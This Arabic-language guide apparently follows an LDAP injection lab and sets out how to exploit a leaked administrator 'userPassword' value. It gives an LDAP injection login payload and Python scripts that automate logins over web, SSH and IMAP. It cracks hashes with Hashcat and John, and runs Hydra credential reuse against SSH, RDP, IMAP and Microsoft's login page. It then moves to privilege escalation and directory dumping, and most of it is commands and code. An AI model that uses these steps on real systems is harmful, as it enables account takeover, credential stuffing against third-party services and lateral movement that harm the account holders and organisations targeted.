## الخطوات العملية لاستغلال خاصية `userPassword`
1. **إعداد البيئة**:
   - استخدم **Burp Suite** أو **OWASP ZAP** لمراقبة وتعديل الطلبات.
   - جهّز أدوات كسر التشفير (مثل Hashcat أو John the Ripper) إذا كانت القيمة مشفرة.
   - حدد الأنظمة المتصلة (مثل البريد الإلكتروني، SSH، RDP) التي قد تستخدم نفس بيانات الاعتماد.
2. **تأكيد كلمة المرور**:
   - أدخل كلمة المرور المستخلصة (مثل `MYKE`) في نموذج تسجيل الدخول.
   - تحقق مما إذا نجح تسجيل الدخول (مثل إعادة توجيه إلى لوحة التحكم).
3. **كسر التشفير (إذا لزم الأمر)**:
   - إذا كانت القيمة مشفرة (مثل `{SHA}2cM6...`)، استخدم أدوات لكسر التشفير.
   - استخدم قوائم كلمات (Wordlists) مثل `rockyou.txt`.
4. **اختبار كلمة المرور في خدمات أخرى**:
   - جرب كلمة المرور في خدمات مرتبطة (مثل البريد الإلكتروني، VPN، أو تطبيقات داخلية).
   - استخدم أدوات مثل Hydra أو Burp Intruder لأتمتة الاختبار.
5. **توسيع الهجوم**:
   - إذا نجح تسجيل الدخول، استكشف النظام لاستخراج بيانات إضافية (مثل قوائم المستخدمين أو الملفات الحساسة).
   - حاول رفع الصلاحيات (Privilege Escalation) إذا كان الحساب محدودًا.
6. **أتمتة العملية**:
   - استخدم سكربتات لاختبار كلمات المرور عبر واجهات متعددة أو لكسر التشفير تلقائيًا.

---

## جميع المحاولات الممكنة لاستغلال خاصية `userPassword` 
سأقسم المحاولات إلى أربع فئات رئيسية:
1. **تأكيد كلمة المرور المستخلصة**: اختبار القيمة في نموذج تسجيل الدخول.
2. **كسر التشفير للقيم المشفرة**: استخدام أدوات لاستخلاص النص العادي من قيم مثل `{SHA}...`.
3. **اختبار كلمة المرور في خدمات أخرى**: تجربة القيمة في أنظمة متصلة.
4. **توسيع الهجوم**: استخدام الوصول المكتسب لاستغلال النظام أو الأنظمة المرتبطة.

### 1. تأكيد كلمة المرور المستخلصة
الهدف هو التحقق مما إذا كانت كلمة المرور المستخلصة (مثل `MYKE`) تعمل فعليًا لتسجيل الدخول.

#### أ. اختبار كلمة المرور في نموذج تسجيل الدخول
- **الإدخال**:
  - اسم المستخدم: `administrator`
  - كلمة المرور: `MYKE`
- **كيف يعمل**:
  - أدخل كلمة المرور المستخلصة في نموذج تسجيل الدخول الأصلي.
  - إذا نجح تسجيل الدخول (مثل إعادة توجيه إلى لوحة التحكم أو رمز حالة HTTP 302)، فالقيمة صحيحة.
- **متى يُستخدم؟**:
  - بعد استخلاص كلمة المرور عبر الاستغلال الأعمى (مثل `MYKE` من استعلامات `userPassword=MYKE*`).
- **الأوامر/الإجراءات**:
  - في المتصفح، أدخل `administrator` و`MYKE` في نموذج تسجيل الدخول.
  - في Burp Suite Repeater، أرسل طلب POST:
    ```
    POST /login HTTP/1.1
    Host: example.com
    Content-Type: application/x-www-form-urlencoded

    username=administrator&password=MYKE
    ```
  - تحقق من الاستجابة (مثل رمز 302 أو نص "Welcome").

#### ب. اختبار كلمة المرور باستخدام استعلام LDAP
- **الاستعلام**: `(&(uid=administrator)(userPassword=MYKE))`
- **الإدخال**:
  - اسم المستخدم: `administrator*)(&(uid=administrator)(userPassword=MYKE))`
  - كلمة المرور: `anything`
- **الاستعلام الناتج**: `(&(uid=administrator*)(&(uid=administrator)(userPassword=MYKE))(userPassword=anything))`
- **كيف يعمل**:
  - يتحقق مما إذا كانت القيمة `MYKE` هي كلمة المرور الصحيحة لـ `administrator`.
  - استجابة إيجابية (مثل صفحة مختلفة أو رمز 200) تؤكد صحة القيمة.
- **متى يُستخدم؟**:
  - للتحقق من كلمة المرور داخل إطار LDAP Injection إذا كان نموذج تسجيل الدخول لا يعمل مباشرة.
- **الأوامر/الإجراءات**:
  - في Burp Suite Repeater، أرسل:
    ```
    POST /login HTTP/1.1
    Host: example.com
    Content-Type: application/x-www-form-urlencoded

    username=administrator*)(&(uid=administrator)(userPassword=MYKE))&password=anything
    ```
  - تحقق من الاستجابة لتأكيد القيمة.

#### ج. أتمتة اختبار كلمة المرور
- **سكربت Python لاختبار كلمة المرور**:
  ```python
  #!/usr/bin/python3
  import requests

  url = "http://TARGET_URL.com/login"  # استبدل بـ URL الموقع
  passwords = ["MYKE", "admin123", "password"]  # قائمة كلمات المرور المستخلصة أو المحتملة
  username = "administrator"

  for password in passwords:
      data = {"username": username, "password": password}
      r = requests.post(url, data=data)
      if "Welcome" in r.text or r.status_code == 302:  # استبدل Welcome بشرط النجاح
          print(f"[+] Valid password found: {password}")
          break
      else:
          print(f"[-] Password {password} failed")
  ```
- **الإعداد**:
  - استبدل `http://TARGET_URL.com/login` بعنوان URL لنموذج تسجيل الدخول.
  - استبدل `"Welcome"` بشرط النجاح (مثل نص في الاستجابة أو `r.status_code == 302`).
  - عدّل `passwords` لتشمل كلمات المرور المستخلصة (مثل `["MYKE"]`).
- **التشغيل**:
  - `python3 test_password.py`
- **المخرجات**:
  - يطبع كلمة المرور الصحيحة (مثل `[+] Valid password found: MYKE`).
- **الأوامر/الإجراءات**:
  - احفظ السكربت كـ `test_password.py` وشغّله.
  - راقب الطلبات في Burp Suite للتأكد من إرسالها بشكل صحيح.

### 2. كسر التشفير للقيم المشفرة
إذا كانت قيمة `userPassword` مشفرة (مثل `{SHA}2cM6...` أو `{MD5}...`)، تحتاج إلى كسر التشفير لاستخلاص النص العادي.

#### أ. تحديد نوع التشفير
- **الأنواع الشائعة**:
  - `{SHA}`: SHA-1 (طول الناتج 40 حرفًا هكساديسيمال).
  - `{SSHA}`: SHA-1 مملح (Salted SHA-1).
  - `{MD5}`: MD5 (طول الناتج 32 حرفًا هكساديسيمال).
  - `{CRYPT}`: تشفير Unix (مثل DES أو MD5).
  - `{PLAIN}`: نص عادي (نادر جدًا).
- **كيف يعمل**:
  - افحص القيمة المستخلصة (مثل `{SHA}2cM6...`) لتحديد نوع التشفير.
  - إذا كانت مشفرة، استخدم أدوات لكسر التشفير.
- **متى يُستخدم؟**:
  - عندما تكون قيمة `userPassword` مشفرة بدلاً من نص عادي.
- **الأوامر/الإجراءات**:
  - سجّل القيمة المستخلصة (مثل `{SHA}2cM6...`).
  - استخدم أداة مثل `hashid` لتحديد نوع التشفير:
    ```
    hashid '{SHA}2cM6...'
    ```
  - المخرجات: تؤكد أنها SHA-1.

#### ب. كسر التشفير باستخدام Hashcat
- **الأداة**: Hashcat
- **الأوامر**:
  - احفظ القيمة المشفرة في ملف (مثل `hash.txt`):
    ```
    2cM6...
    ```
  - شغّل Hashcat مع وضع SHA-1 (Mode 100):
    ```
    hashcat -m 100 hash.txt /path/to/rockyou.txt
    ```
  - لتشفير مملح (مثل SSHA):
    ```
    hashcat -m 110 hash.txt /path/to/rockyou.txt
    ```
- **كيف يعمل**:
  - Hashcat يقارن الهاش مع قائمة كلمات (مثل `rockyou.txt`) لاستخلاص النص العادي.
  - إذا نجح، يعرض النص العادي (مثل `MYKE`).
- **متى يُستخدم؟**:
  - عندما تكون القيمة هاش SHA-1، MD5، أو أي نوع آخر مدعوم.
- **الأوامر/الإجراءات**:
  - قم بتثبيت Hashcat: `sudo apt install hashcat`
  - احصل على قائمة كلمات (مثل `rockyou.txt` من GitHub أو SecLists).
  - شغّل الأمر أعلاه وراجع المخرجات.

#### ج. كسر التشفير باستخدام John the Ripper
- **الأداة**: John the Ripper
- **الأوامر**:
  - احفظ الهاش في ملف (مثل `hash.txt`):
    ```
    administrator:{SHA}2cM6...
    ```
  - شغّل John:
    ```
    john --format=raw-sha1 hash.txt
    ```
  - لتشفير مملح (SSHA):
    ```
    john --format=ssha hash.txt
    ```
- **كيف يعمل**:
  - John يحاول كسر الهاش باستخدام قوائم كلمات أو قواعد تخمين.
  - يعرض النص العادي إذا نجح (مثل `MYKE`).
- **متى يُستخدم؟**:
  - كبديل لـ Hashcat أو إذا كنت تفضل John.
- **الأوامر/الإجراءات**:
  - قم بتثبيت John: `sudo apt install john`
  - شغّل الأمر أعلاه وراجع المخرجات.

### 3. اختبار كلمة المرور في خدمات أخرى
إذا نجحت في الحصول على كلمة مرور (مثل `MYKE`) أو كسرت هاش، جربها في خدمات أخرى قد تستخدم نفس بيانات الاعتماد.

#### أ. اختبار في البريد الإلكتروني
- **الخدمة**: خادم بريد (مثل Outlook، Gmail، أو خادم IMAP/SMTP داخلي)
- **الإدخال**:
  - اسم المستخدم: `administrator@domain.com`
  - كلمة المرور: `MYKE`
- **كيف يعمل**:
  - استخدم عميل بريد (مثل Thunderbird) أو واجهة ويب (مثل `mail.domain.com`) لاختبار بيانات الاعتماد.
  - إذا نجح تسجيل الدخول، يمكنك الوصول إلى رسائل البريد.
- **متى يُستخدم؟**:
  - عندما تعتقد أن كلمة المرور تُستخدم في خدمات البريد.
- **الأوامر/الإجراءات**:
  - في المتصفح، جرب تسجيل الدخول إلى `https://mail.domain.com`.
  - استخدم أداة مثل Hydra لأتمتة الاختبار:
    ```
    hydra -l administrator@domain.com -p MYKE imap://mail.domain.com
    ```

#### ب. اختبار في SSH
- **الخدمة**: خادم SSH
- **الإدخال**:
  - اسم المستخدم: `administrator`
  - كلمة المرور: `MYKE`
- **كيف يعمل**:
  - استخدم عميل SSH (مثل `ssh` في Linux أو PuTTY) لمحاولة الاتصال.
  - إذا نجح، تحصل على وصول إلى الخادم.
- **متى يُستخدم؟**:
  - إذا كان النظام يحتوي على خادم SSH يستخدم نفس بيانات الاعتماد.
- **الأوامر/الإجراءات**:
  - في الطرفية:
    ```
    ssh administrator@target_ip
    ```
  - أدخل `MYKE` عند الطلب.
  - استخدم Hydra للأتمتة:
    ```
    hydra -l administrator -p MYKE ssh://target_ip
    ```

#### ج. اختبار في RDP
- **الخدمة**: Remote Desktop Protocol (RDP)
- **الإدخال**:
  - اسم المستخدم: `administrator`
  - كلمة المرور: `MYKE`
- **كيف يعمل**:
  - استخدم عميل RDP (مثل `mstsc` في Windows أو Remmina في Linux).
  - إذا نجح، تحصل على وصول إلى سطح المكتب البعيد.
- **متى يُستخدم؟**:
  - إذا كان النظام يدعم RDP.
- **الأوامر/الإجراءات**:
  - في Windows، افتح `mstsc`، أدخل `target_ip`، ثم `administrator` و`MYKE`.
  - استخدم Hydra:
    ```
    hydra -l administrator -p MYKE rdp://target_ip
    ```

#### د. أتمتة اختبار الخدمات
- **سكربت Python لاختبار خدمات متعددة**:
  ```python
  #!/usr/bin/python3
  import requests
  import paramiko  # لـ SSH
  from imaplib import IMAP4

  username = "administrator"
  password = "MYKE"
  target = "target_ip_or_domain"

  # اختبار تسجيل الدخول عبر الويب
  url = f"http://{target}/login"
  data = {"username": username, "password": password}
  r = requests.post(url, data=data)
  if "Welcome" in r.text or r.status_code == 302:
      print(f"[+] Web login successful with {username}:{password}")
  else:
      print(f"[-] Web login failed")

  # اختبار SSH
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try:
      ssh.connect(target, username=username, password=password)
      print(f"[+] SSH login successful with {username}:{password}")
      ssh.close()
  except:
      print(f"[-] SSH login failed")

  # اختبار IMAP
  try:
      mail = IMAP4(target)
      mail.login(f"{username}@{target}", password)
      print(f"[+] IMAP login successful with {username}@{target}:{password}")
      mail.logout()
  except:
      print(f"[-] IMAP login failed")
  ```
- **الإعداد**:
  - قم بتثبيت المكتبات: `pip install requests paramiko`
  - استبدل `target_ip_or_domain` باسم النطاق أو IP الهدف.
  - استبدل `"Welcome"` بشرط النجاح للويب.
  - عدّل `username` و`password` حسب القيم المستخلصة.
- **التشغيل**:
  - `python3 test_services.py`
- **المخرجات**:
  - يطبع نتائج اختبار الخدمات (مثل `[+] Web login successful with administrator:MYKE`).
- **الأوامر/الإجراءات**:
  - احفظ السكربت كـ `test_services.py` وشغّله.
  - استخدم Burp Suite لمراقبة طلبات الويب.

### 4. توسيع الهجوم
بعد تأكيد كلمة المرور أو الوصول إلى النظام، يمكنك توسيع الهجوم لتحقيق أهداف إضافية.

#### أ. استخراج بيانات إضافية
- **الهدف**: استخدام الحساب المخترق (مثل `administrator`) لاستخراج بيانات حساسة.
- **كيف يعمل**:
  - بعد تسجيل الدخول، استكشف لوحة التحكم أو واجهة المستخدم.
  - ابحث عن قوائم المستخدمين، الملفات، أو الإعدادات الحساسة.
- **متى يُستخدم؟**:
  - عندما يمنحك تسجيل الدخول وصولًا إلى بيانات إضافية.
- **الأوامر/الإجراءات**:
  - في المتصفح، تصفح لوحة التحكم بعد تسجيل الدخول بـ `administrator:MYKE`.
  - استخدم Burp Suite Spider أو Crawler لاستكشاف الروابط المتاحة:
    ```
    Spider: /dashboard, /users, /settings
    ```
  - قم بتصدير البيانات (مثل قوائم المستخدمين) إذا أمكن.

#### ب. رفع الصلاحيات
- **الهدف**: رفع صلاحيات الحساب إلى إداري إذا كان محدودًا.
- **كيف يعمل**:
  - تحقق مما إذا كان الحساب لديه صلاحيات لتعديل إعدادات المستخدمين أو إضافة حسابات إدارية.
  - استغل ثغرات داخل النظام (مثل سوء تكوين أو ثغرات محلية).
- **متى يُستخدم؟**:
  - إذا كان الحساب المخترق ليس إداريًا بالكامل.
- **الأوامر/الإجراءات**:
  - في لوحة التحكم، ابحث عن إعدادات المستخدمين أو إدارة الحسابات.
  - إذا كنت في خادم عبر SSH، جرب أوامر رفع الصلاحيات:
    ```
    sudo -l
    ```
  - استخدم أدوات مثل LinPEAS أو WinPEAS للبحث عن ثغرات:
    ```
    ./linpeas.sh
    ```

#### ج. اختبار Credential Stuffing
- **الهدف**: استخدام كلمة المرور في أنظمة أخرى غير مرتبطة.
- **كيف يعمل**:
  - جرب كلمة المرور في مواقع شائعة (مثل Gmail، LinkedIn) إذا كنت تعرف بريدًا إلكترونيًا مرتبطًا.
  - استخدم أدوات أتمتة لاختبار بيانات الاعتماد.
- **متى يُستخدم؟**:
  - عندما تعتقد أن المستخدم يعيد استخدام كلمات المرور.
- **الأوامر/الإجراءات**:
  - استخدم أداة مثل CredMaster أو Burp Intruder:
    ```
    hydra -l administrator@domain.com -p MYKE https-post-form "login.microsoftonline.com:username=^USER^&password=^PASS^:F=Invalid"
    ```
  - جرب يدويًا في مواقع مثل `https://mail.google.com`.

#### د. استخراج كائنات LDAP إضافية
- **الهدف**: استخدام الحساب المخترق للوصول إلى خادم LDAP مباشرة أو استخراج كائنات أخرى.
- **كيف يعمل**:
  - إذا سمح الحساب بالوصول إلى أدوات إدارة LDAP (مثل phpLDAPadmin)، استخدمها لاستخراج بيانات.
  - استخدم أدوات مثل `ldapsearch` إذا كان لديك وصول إلى الخادم.
- **متى يُستخدم؟**:
  - عندما يمنحك الحساب وصولًا إلى واجهة إدارة LDAP.
- **الأوامر/الإجراءات**:
  - استخدم `ldapsearch`:
    ```
    ldapsearch -x -H ldap://target_ip -D "cn=administrator,dc=domain,dc=com" -w MYKE -b "dc=domain,dc=com" "(objectClass=*)"
    ```
  - تصفح واجهة مثل `https://ldap.domain.com` باستخدام `administrator:MYKE`.


---

## ملخص جميع المحاولات
### تأكيد كلمة المرور المستخلصة
| **الغرض**                     | **الإدخال/الأمر**                                                                 | **الاستعلام الناتج/الإجراء**                                                                 | **متى يُستخدم؟**                                                                 |
|-------------------------------|-----------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------|
| اختبار في نموذج تسجيل الدخول | Username: `administrator`, Password: `MYKE`                                        | `POST /login` with `username=administrator&password=MYKE`                                   | بعد استخلاص كلمة المرور (مثل `MYKE`).                                           |
| اختبار باستخدام استعلام LDAP | Username: `administrator*)(&(uid=administrator)(userPassword=MYKE))`               | `(&(uid=administrator*)(&(uid=administrator)(userPassword=MYKE))(userPassword=anything))`    | للتحقق ضمن إطار LDAP Injection.                                                 |
| أتمتة الاختبار                | `python3 test_password.py`                                                        | Script tests `username=administrator`, `password=MYKE`                                      | عند وجود عدة كلمات مرور للاختبار.                                               |

### كسر التشفير للقيم المشفرة
| **الغرض**                     | **الإدخال/الأمر**                                                                 | **الإجراء**                                                                                 | **متى يُستخدم؟**                                                                 |
|-------------------------------|-----------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------|
| تحديد نوع التشفير            | `hashid '{SHA}2cM6...'`                                                           | Identifies hash type (e.g., SHA-1)                                                          | عندما تكون القيمة مشفرة.                                                        |
| كسر باستخدام Hashcat         | `hashcat -m 100 hash.txt /path/to/rockyou.txt`                                    | Cracks SHA-1 hash using `rockyou.txt`                                                      | لاستخلاص النص العادي من هاش SHA-1.                                              |
| كسر باستخدام John            | `john --format=raw-sha1 hash.txt`                                                 | Cracks SHA-1 hash                                                                          | كبديل لـ Hashcat.                                                                |

### اختبار كلمة المرور في خدمات أخرى
| **الغرض**                     | **الإدخال/الأمر**                                                                 | **الإجراء**                                                                                 | **متى يُستخدم؟**                                                                 |
|-------------------------------|-----------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------|
| اختبار في البريد الإلكتروني  | `hydra -l administrator@domain.com -p MYKE imap://mail.domain.com`                 | Tests credentials on IMAP server                                                            | عند وجود خادم بريد.                                                              |
| اختبار في SSH                | `ssh administrator@target_ip` with `MYKE`                                         | Attempts SSH login                                                                         | عند وجود خادم SSH.                                                               |
| اختبار في RDP                | `mstsc` with `target_ip`, `administrator`, `MYKE`                                  | Attempts RDP login                                                                         | عند وجود خادم RDP.                                                               |
| أتمتة اختبار الخدمات         | `python3 test_services.py`                                                        | Tests Web, SSH, IMAP logins                                                                | لاختبار خدمات متعددة بسرعة.                                                     |

### توسيع الهجوم
| **الغرض**                     | **الإدخال/الأمر**                                                                 | **الإجراء**                                                                                 | **متى يُستخدم؟**                                                                 |
|-------------------------------|-----------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------|
| استخراج بيانات إضافية        | Browse `/dashboard`, `/users` after login                                         | Explores system for sensitive data                                                         | بعد تسجيل الدخول الناجح.                                                        |
| رفع الصلاحيات               | `sudo -l` or `./linpeas.sh`                                                       | Checks for privilege escalation opportunities                                               | إذا كان الحساب محدودًا.                                                          |
| Credential Stuffing            | `hydra -l administrator@domain.com -p MYKE https-post-form ...`                    | Tests credentials on external services                                                     | عند الاشتباه في إعادة استخدام كلمات المرور.                                    |
| استخراج كائنات LDAP          | `ldapsearch -x -H ldap://target_ip -D "cn=administrator,dc=domain,dc=com" -w MYKE` | Queries LDAP directory for additional objects                                               | عند وجود وصول إلى واجهة LDAP.                                                   |

---

## مثال عملي باستخدام Burp Suite والسكربتات
1. **إعداد Burp Suite**:
   - اضبط الوكيل إلى `127.0.0.1:8080`.
   - اختبر كلمة المرور يدويًا:
     ```
     POST /login HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded

     username=administrator&password=MYKE
     ```
   - تحقق من الاستجابة (مثل رمز 302 أو نص "Welcome").
2. **تأكيد كلمة المرور**:
   - استخدم `test_password.py` لاختبار `MYKE` تلقائيًا.
   - شغّل: `python3 test_password.py`
   - إذا نجح، انتقل إلى الخطوات التالية.
3. **كسر هاش (إذا لزم الأمر)**:
   - إذا كانت القيمة `{SHA}2cM6...`، احفظها في `hash.txt`.
   - شغّل:
     ```
     hashcat -m 100 hash.txt /path/to/rockyou.txt
     ```
   - استخدم النص العادي الناتج (مثل `MYKE`) في تسجيل الدخول.
4. **اختبار خدمات أخرى**:
   - استخدم `test_services.py` لاختبار الويب، SSH، وIMAP.
   - شغّل: `python3 test_services.py`
   - جرب يدويًا إذا لزم الأمر (مثل `ssh administrator@target_ip`).
5. **توسيع الهجوم**:
   - بعد تسجيل الدخول، تصفح `/admin/users` في المتصفح.
   - إذا كنت في خادم عبر SSH، شغّل:
     ```
     ./linpeas.sh
     ```
   - استخدم `ldapsearch` إذا كان لديك وصول إلى LDAP:
     ```
     ldapsearch -x -H ldap://target_ip -D "cn=administrator,dc=domain,dc=com" -w MYKE
     ```

---
